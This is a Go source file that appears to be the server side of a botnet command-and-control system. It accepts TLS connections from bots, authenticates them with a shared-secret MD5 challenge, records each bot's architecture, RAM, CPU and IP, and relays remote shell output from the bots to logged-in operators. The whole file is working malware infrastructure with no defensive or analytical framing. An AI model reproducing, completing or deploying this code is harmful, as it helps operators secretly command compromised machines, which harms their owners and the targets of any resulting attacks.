package main

import (
	"bufio"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"
)

// ============================================================================
// TLS CONFIGURATION
// Configures secure TLS 1.2+ encryption for bot-to-CNC communication.
// Requires server.crt and server.key files generated during setup.
// Uses modern cipher suites with forward secrecy (ECDHE) for security.
// ============================================================================

// loadTLSConfig loads X.509 certificates and configures secure TLS settings
// Checks both ./cnc/certificates/ (project root) and ./certificates/ (cnc dir)
// Enforces TLS 1.2 minimum to reject outdated/vulnerable protocols
// Prefers X25519 and P256 curves for key exchange (modern and fast)
// Server cipher preference prevents clients from choosing weak ciphers
// Fatal error if certs missing - CNC cannot operate without encryption
func loadTLSConfig() *tls.Config {
	// Try project root path first (./cnc/certificates/), then local path (./certificates/)
	certPaths := []struct{ cert, key string }{
		{"./cnc/certificates/server.crt", "./cnc/certificates/server.key"},
		{"./certificates/server.crt", "./certificates/server.key"},
	}

	var cert tls.Certificate
	var err error
	var loaded bool

	for _, p := range certPaths {
		cert, err = tls.LoadX509KeyPair(p.cert, p.key)
		if err == nil {
			loaded = true
			break
		}
	}

	if !loaded {
		fmt.Printf("[FATAL] Failed to load TLS certificates: %v\n", err)
		fmt.Println("[FATAL] Make sure server.crt and server.key exist in ./cnc/certificates/ or ./certificates/")
		os.Exit(1)
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		CurvePreferences: []tls.CurveID{
			tls.X25519,    // Modern, fast elliptic curve
			tls.CurveP256, // Fallback NIST curve
		},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			// AES-GCM ciphers with SHA-384/256 for authenticated encryption
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			// ChaCha20-Poly1305 for devices without AES hardware acceleration
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			// AES-128 variants for lower resource environments
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}
}

// validateTLSHandshake performs TLS security validation on incoming connections
// Ensures the connection uses TLS 1.2+ (rejects old vulnerable protocols)
// Validates cipher suite is modern with forward secrecy (ECDHE + AES-GCM/ChaCha20)
// TLS 1.3 connections auto-accepted (all TLS 1.3 ciphers are secure)
// Rejects connections that don't meet security standards
// On success, hands off to handleBotConnection for authentication
func validateTLSHandshake(conn net.Conn) {
	defer func() {
		// Panic recovery to prevent single bad connection from crashing server
		if r := recover(); r != nil {
			logMsg("[PANIC] in validateTLSHandshake: %v", r)
			conn.Close()
		}
	}()

	// Type assert to TLS connection
	tlsConn, ok := conn.(*tls.Conn)
	if !ok {
		return
	}

	// 10 second deadline for handshake to prevent slow-loris attacks
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))

	if err := tlsConn.Handshake(); err != nil {
		return
	}

	// Enforce minimum TLS 1.2 - older versions have known vulnerabilities
	state := tlsConn.ConnectionState()
	if state.Version < tls.VersionTLS12 {
		tlsConn.Close()
		return
	}

	// Whitelist of acceptable cipher suites with forward secrecy
	validCiphers := map[uint16]bool{
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:   true,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256: true,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:         true,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:       true,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:         true,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:       true,
		0x1301: true, // TLS_AES_128_GCM_SHA256 (TLS 1.3)
		0x1302: true, // TLS_AES_256_GCM_SHA384 (TLS 1.3)
		0x1303: true, // TLS_CHACHA20_POLY1305_SHA256 (TLS 1.3)
	}

	if state.Version == tls.VersionTLS13 {
		logMsg("[ACCEPT] TLS 1.3 connection from %s", conn.RemoteAddr())
	} else if !validCiphers[state.CipherSuite] {
		tlsConn.Close()
		return
	}

	// Reset deadline for authentication phase
	tlsConn.SetDeadline(time.Time{})

	// Start authentication process (runs in goroutine)
	go handleBotConnection(conn)
}

// ============================================================================
// AUTHENTICATION FUNCTIONS
// These functions handle the challenge-response authentication between
// the CNC server and bots. Uses MD5 hashing with the magic code to verify
// that connecting bots are legitimate.
// ============================================================================

// generateAuthResponse creates an MD5-based authentication response
// Takes a random challenge string and the shared secret (magic code)
// Concatenates challenge + secret + challenge, then MD5 hashes it
// Returns Base64 encoded hash that must match the bot's response
// This ensures bots know the magic code without transmitting it in plaintext
func generateAuthResponse(challenge, secret string) string {
	h := md5.New()
	h.Write([]byte(challenge + secret + challenge))
	response := base64.StdEncoding.EncodeToString(h.Sum(nil))
	return response
}

// randomChallenge generates a random alphanumeric string for authentication
// Creates a unique challenge for each bot connection attempt
// Uses standard alphanumeric charset (a-z, A-Z, 0-9) for compatibility
// Length parameter determines challenge complexity (typically 32 chars)
// Each bot gets a different challenge preventing replay attacks
func randomChallenge(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// ============================================================================
// BOT MANAGEMENT FUNCTIONS
// These functions manage the lifecycle of bot connections including
// registration, removal, cleanup, and tracking of bot metadata.
// Thread-safe operations using RWMutex for concurrent access.
// ============================================================================

// addBotConnection registers a newly authenticated bot in the connections map
// Handles duplicate bot IDs by closing the old connection (prevents stale entries)
// Stores bot metadata: connection socket, unique ID, architecture, RAM, CPU, timestamps
// Uses mutex locking for thread-safe map access (multiple bots connect concurrently)
// Maintains both new map-based storage and legacy slice for backwards compatibility
func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCores int) {
	botConnsLock.Lock()
	defer botConnsLock.Unlock()

	// Check for duplicates - if same bot reconnects, close old socket
	if existing, exists := botConnections[botID]; exists {
		// Close old connection to prevent zombie sockets
		if existing.conn != nil {
			existing.conn.Close()
		}
		logMsg("[☾℣☽] Replacing duplicate bot connection: %s (%s)", botID, conn.RemoteAddr())
	}

	botConn := &BotConnection{
		conn:          conn,
		botID:         botID,
		connectedAt:   time.Now(),
		lastPing:      time.Now(),
		authenticated: true,
		arch:          arch,
		ip:            conn.RemoteAddr().String(),
		ram:           ram,
		cpuCores:      cpuCores,
		userConn:      nil, // No user controlling initially
	}

	botConnections[botID] = botConn
	botConns = append(botConns, conn)
	botCount++

	// Notify TUI of connection
	LogBotConnection(arch, true)

	logMsg("[☾℣☽] Bot authenticated: %s | Arch: %s | RAM: %dMB | CPU: %d | IP: %s | Total: %d",
		botID, arch, ram, cpuCores, conn.RemoteAddr(), botCount)
}

// removeBotConnection cleanly removes a bot from all tracking structures
// Closes the network connection to free up system resources
// Removes from main connections map and decrements global bot count
// Also cleans up the command origin map (tracks which user sent commands)
// Removes from legacy botConns slice for backwards compatibility
// Thread-safe with mutex locking for both maps
func removeBotConnection(botID string) {
	botConnsLock.Lock()
	defer botConnsLock.Unlock()

	if botConn, exists := botConnections[botID]; exists {
		arch := botConn.arch
		botConn.conn.Close()
		delete(botConnections, botID)
		botCount--

		// Notify TUI of disconnection
		LogBotConnection(arch, false)

		// Remove from command origin map (tracks user->bot command routing)
		originLock.Lock()
		delete(commandOrigin, botID)
		originLock.Unlock()

		// Remove from legacy list for backwards compatibility
		for i, conn := range botConns {
			if conn == botConn.conn {
				botConns = append(botConns[:i], botConns[i+1:]...)
				break
			}
		}
	}
}

// cleanupDeadBots runs as a background goroutine to remove stale connections
// Checks every 60 seconds for bots that haven't sent a PONG in 5 minutes
// Dead bots can occur from network issues, bot crashes, or firewall blocks
// Prevents resource leaks from accumulating zombie connections over time
// Logs cleanup activity for monitoring and debugging purposes
func cleanupDeadBots() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		botConnsLock.Lock()
		now := time.Now()
		deadBots := []string{}

		// Scan all bots and check last ping timestamp
		for botID, botConn := range botConnections {
			// 5 minute timeout - generous to handle network latency
			if now.Sub(botConn.lastPing) > 5*time.Minute {
				deadBots = append(deadBots, botID)
				logMsg("[CLEANUP] Removing dead bot: %s (Last ping: %v ago)",
					botID, now.Sub(botConn.lastPing))
			}
		}

		for _, botID := range deadBots {
			if botConn, exists := botConnections[botID]; exists {
				botConn.conn.Close()
				delete(botConnections, botID)
				botCount--

				// Clean up from origin map
				originLock.Lock()
				delete(commandOrigin, botID)
				originLock.Unlock()
			}
		}
		botConnsLock.Unlock()

		if len(deadBots) > 0 {
			logMsg("[CLEANUP] Removed %d dead bots | Total alive: %d", len(deadBots), botCount)
		}
	}
}

// ============================================================================
// BOT CONNECTION HANDLER
// Main function that handles the entire lifecycle of a bot connection:
// 1. Challenge-response authentication to verify bot legitimacy
// 2. Protocol version verification for compatibility
// 3. Bot registration with metadata (ID, arch, RAM)
// 4. Continuous command loop for receiving bot responses and pings
// 5. Cleanup on disconnect to free resources
// ============================================================================

// handleBotConnection manages authentication and command routing for a single bot
// Runs as a goroutine for each incoming bot connection
// Implements the full authentication handshake protocol
// Routes shell command output back to the user who issued the command
// Handles Base64-encoded output for binary-safe transmission
func handleBotConnection(conn net.Conn) {
	defer func() {
		// Cleanup: Find and remove bot from connections map on disconnect
		botConnsLock.Lock()
		for botID, botConn := range botConnections {
			if botConn.conn == conn {
				delete(botConnections, botID)
				botCount--
				logMsg("[☾℣☽] Bot disconnected: %s (%s)", botID, conn.RemoteAddr())
				break
			}
		}

		// Remove from legacy list
		for i, botConn := range botConns {
			if botConn == conn {
				botConns = append(botConns[:i], botConns[i+1:]...)
				break
			}
		}
		botConnsLock.Unlock()

		conn.Close()
	}()

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	// Step 1: Send authentication challenge
	challenge := randomChallenge(32)
	if _, err := writer.WriteString(fmt.Sprintf("AUTH_CHALLENGE:%s\n", challenge)); err != nil {
		return
	}
	writer.Flush()

	logMsg("[AUTH] Sent challenge to %s", conn.RemoteAddr())

	// Step 2: Read bot's response
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	authResponse, err := reader.ReadString('\n')
	if err != nil {
		logMsg("[AUTH] Failed to read auth response from %s: %v", conn.RemoteAddr(), err)
		return
	}

	authResponse = strings.TrimSpace(authResponse)

	// Step 3: Verify response
	expectedResponse := generateAuthResponse(challenge, MAGIC_CODE)
	if authResponse != expectedResponse {
		logMsg("[AUTH] Invalid auth from %s. Got: %s... Expected: %s...",
			conn.RemoteAddr(),
			safeSubstring(authResponse, 0, 10),
			safeSubstring(expectedResponse, 0, 10))
		writer.WriteString("AUTH_FAILED\n")
		writer.Flush()
		return
	}

	// Step 4: Send success
	writer.WriteString("AUTH_SUCCESS\n")
	writer.Flush()

	logMsg("[AUTH] Authentication successful for %s", conn.RemoteAddr())

	// Step 5: Wait for bot registration
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	registerMsg, err := reader.ReadString('\n')
	if err != nil {
		logMsg("[AUTH] Failed to read registration from %s: %v", conn.RemoteAddr(), err)
		return
	}

	registerMsg = strings.TrimSpace(registerMsg)

	// Parse registration message (expected format: "REGISTER:v1.0:botID:arch")
	if !strings.HasPrefix(registerMsg, "REGISTER:") {
		logMsg("[AUTH] Invalid registration format from %s: %s", conn.RemoteAddr(), registerMsg)
		return
	}

	parts := strings.Split(registerMsg, ":")
	if len(parts) < 3 {
		logMsg("[AUTH] Malformed registration from %s: %s", conn.RemoteAddr(), registerMsg)
		return
	}

	version := parts[1]
	botID := parts[2]
	arch := "unknown"
	if len(parts) > 3 {
		arch = parts[3]
	}
	// Parse RAM (in MB) - expected format: REGISTER:version:botID:arch:ram:cpu
	var ram int64 = 0
	if len(parts) > 4 {
		fmt.Sscanf(parts[4], "%d", &ram)
	}
	// Parse CPU cores
	var cpuCores int = 0
	if len(parts) > 5 {
		fmt.Sscanf(parts[5], "%d", &cpuCores)
	}

	// Your existing version check
	if version != PROTOCOL_VERSION {
		logMsg("[AUTH] Version mismatch from %s: got %s, expected %s",
			conn.RemoteAddr(), version, PROTOCOL_VERSION)
		return
	}

	// Add bot to connections
	addBotConnection(conn, botID, arch, ram, cpuCores)

	// Reset deadline for normal operation
	conn.SetDeadline(time.Time{})

	// Start ping handler
	stopPing := make(chan struct{})
	defer close(stopPing)
	go pingHandler(conn, botID, stopPing)

	// Main bot command loop
	for {
		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
		line, err := reader.ReadString('\n')
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// Timeout - send ping
				writer.WriteString("PING\n")
				writer.Flush()
				continue
			}
			break
		}

		line = strings.TrimSpace(line)

		// Update last ping time
		if line == "PONG" {
			botConnsLock.Lock()
			if botConn, exists := botConnections[botID]; exists {
				botConn.lastPing = time.Now()
			}
			botConnsLock.Unlock()
			continue
		}

		// Handle Base64 encoded output from shell commands
		if strings.HasPrefix(line, "OUTPUT_B64:") {
			// Extract the Base64 string
			b64Str := strings.TrimPrefix(line, "OUTPUT_B64:")
			b64Str = strings.TrimSpace(b64Str)

			// Decode Base64
			decoded, err := base64.StdEncoding.DecodeString(b64Str)
			if err != nil {
				logMsg("[BOT-%s] Failed to decode Base64 output: %v", botID, err)
			} else {
				// Format the decoded output nicely
				output := string(decoded)

				// Forward to TUI if active
				if tuiMode && tuiProgram != nil {
					tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: output})
				} else {
					// Only print to console if not in TUI mode
					logMsg("[BOT-%s] Shell Output (%d bytes)", botID, len(decoded))
				}

				// Check if we should forward this to a user
				originLock.RLock()
				userConn, hasUser := commandOrigin[botID]
				originLock.RUnlock()

				if hasUser && userConn != nil {
					// Send formatted output to user
					forwardBotResponseToUser(botID, output, userConn)

					// Clear the origin after sending response
					originLock.Lock()
					delete(commandOrigin, botID)
					originLock.Unlock()
				}
			}
			continue
		}

		// Handle other bot messages
		logMsg("[BOT-%s] %s", botID, line)

		// Check if we should forward this to a user
		originLock.RLock()
		userConn, hasUser := commandOrigin[botID]
		originLock.RUnlock()

		if hasUser && userConn != nil {
			// Send message to user
			userConn.Write([]byte(fmt.Sprintf("[Bot: %s] %s\r\n", botID, line)))

			// Clear the origin after sending response
			originLock.Lock()
			delete(commandOrigin, botID)
			originLock.Unlock()
		}
	}
}

// ============================================================================
// CONNECTION I/O UTILITIES
// Helper functions for reading user input from network connections.
// Handle line-based text protocols (Telnet-style) with newline trimming.
// ============================================================================

// getFromConn reads a single line from a network connection (creates new reader)
// Reads until newline delimiter (Telnet-style line input)
// Strips trailing \n and \r for clean string processing
// Creates a new bufio.Reader each call - use getFromConnReader for reuse
func getFromConn(conn net.Conn) (string, error) {
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return readString, err
	}
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return readString, nil
}

// getFromConnReader reads a single line using existing bufio.Reader
// More efficient than getFromConn - reuses reader buffer across reads
// Used in user session loops where multiple inputs are expected
// Strips trailing newlines for clean command parsing
func getFromConnReader(reader *bufio.Reader) (string, error) {
	readString, err := reader.ReadString('\n')
	if err != nil {
		return readString, err
	}
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return readString, nil
}

// forwardBotResponseToUser sends shell command output to the user who requested it
// Formats the output with ANSI colors for visual clarity in terminal
// Includes the bot ID so users know which bot generated the response
// Wraps output in decorative borders for easy reading
// Handles edge case of output not ending with newline
func forwardBotResponseToUser(botID, response string, userConn net.Conn) {
	if response == "" {
		return
	}

	// Send formatted output with colored header and borders
	userConn.Write([]byte(fmt.Sprintf("\033[1;36m[Bot: %s] Shell Output:\r\n", botID)))
	userConn.Write([]byte("\033[1;33m══════════════════════════════════════════════════════════\r\n"))
	userConn.Write([]byte("\033[0m")) // Reset color for actual output
	userConn.Write([]byte(response))
	if !strings.HasSuffix(response, "\n") {
		userConn.Write([]byte("\r\n"))
	}
	userConn.Write([]byte("\033[1;33m══════════════════════════════════════════════════════════\r\n"))
	userConn.Write([]byte("\033[0m")) // Reset color after output
}

// authUser handles the login prompt and credential verification for admin users
// Allows up to 3 login attempts before disconnecting (brute force protection)
// Prompts for username and password with styled colored prompts
// Password field uses white-on-white text (hidden) for privacy
// On success, creates client struct and adds to active clients list
// Returns (true, client) on success, (false, nil) on failure
func authUser(conn net.Conn, reader *bufio.Reader) (bool, *client) {

	for i := 0; i < 3; i++ { // 3 attempts max
		// Render login banner using ui.go function
		RenderLoginBanner(conn)

		// Attempt counter
		if i > 0 {
			RenderAttemptCounter(conn, i)
		}

		// Input prompts
		RenderInputBox(conn)
		RenderUserPrompt(conn)

		username, err := getFromConnReader(reader)
		if err != nil {
			return false, nil
		}

		RenderPasswordPrompt(conn)

		password, err := getFromConnReader(reader)
		if err != nil {
			return false, nil
		}

		RenderInputBoxClose(conn)

		// Authentication animation
		RenderAuthAnimation(conn)

		if exists, user := AuthUser(username, password); exists {
			RenderAccessGranted(conn)
			conn.Write([]byte(ClearScreen))

			loggedClient := &client{
				conn: conn,
				user: *user,
			}
			clients = append(clients, loggedClient)
			return true, loggedClient
		}

		RenderAccessDenied(conn)
	}

	// Final lockout message
	RenderLockout(conn)
	conn.Close()
	return false, nil
}
